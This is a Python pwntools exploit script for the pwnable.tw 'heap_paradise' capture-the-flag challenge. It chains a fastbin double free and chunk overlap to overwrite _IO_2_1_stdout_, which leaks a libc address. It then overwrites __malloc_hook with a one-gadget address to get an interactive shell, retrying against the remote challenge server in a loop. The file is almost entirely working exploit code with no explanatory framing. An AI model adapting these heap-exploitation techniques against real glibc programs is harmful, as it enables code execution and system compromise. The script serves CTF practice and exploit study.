#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./heap_paradise"
ip = "chall.pwnable.tw"
port = 10308

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_64.so.6"
    

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "You Choice:", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, size, con):
    choice(io, 1)
    sla(io, "Size :", str(size))
    sa(io, "Data :", con)

def remove(io, idx):
    choice(io, 2)
    sla(io, "Index :", str(idx))

bps.append("*0x555555554000+0xCF4")  
gds['data']=0x202040+0x555555554000



def pwn(io):
    add(io, 0x60, b'a'*0x8) # 0
    add(io, 0x60, b'b'*0x48 + p64(0x21)) # 1

    remove(io, 0)
    remove(io, 1)
    remove(io, 0)

    add(io, 0x60, b'\x20') # 2

    add(io, 0x60, b'd'*0x18) # 3
    add(io, 0x60, b'd'*0x18 + p64(0x71)) # 4

    add(io, 0x60, b'e'*0x8) # 5

    remove(io, 0)

    add(io, 0x60, b'm'*0x18 + p64(0xa1)) # 6

    remove(io, 5)
    remove(io, 0)
    remove(io, 1)


    add(io, 0x78, b'f'*0x48 + p64(0x71) + b'\xa0') # 7

    add(io, 0x60, b'g'*0x28 + p64(0x71) + p16(0x75dd))  # 8

    add(io, 0x68, b'g'*8)   # 9

    # 

    mydebug(io, "c\nset *((char *)&_IO_2_1_stderr_+157+8)=0x7f\nc\nc\nc\nc\nset *((char*)&__malloc_hook-0x23+8)=0x7f\nc")

    add(io, 0x68, b'\x00'*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + b'\x00')  # 10


    rv(io, 0x40)
    libc_addr = u64(rv(io, 6) + b'\x00\x00')
    libc.address = libc_base = libc_addr - 0x3c4600
    mh = libc.sym['__malloc_hook']
    fake_chunk = mh - 0x23

    log.info("libc_addr : 0x%x", libc_addr)
    log.info("libc_base : 0x%x", libc_base)
    log.info("mh : 0x%x", mh)
    log.info("oneshot : 0x%x", 0xf0567+libc_base)

    # input()

    remove(io, 0)
    remove(io, 1)
    remove(io, 0)

    add(io, 0x60, p64(fake_chunk))  # 11
    add(io, 0x60, p64(fake_chunk))  # 12
    add(io, 0x60, p64(fake_chunk))  # 13

    add(io, 0x60, b'a'*0x13 + p64(0xf0567+libc_base)) # 14

    choice(io, 1)
    sla(io, "Size :", str(0x10))

    io.interactive()


while True:
    context.log_level = 'debug'
    libc = ELF(remote_libc)
    try:
        io = remote(ip, port)
        pwn(io)
    except:
        io.close()
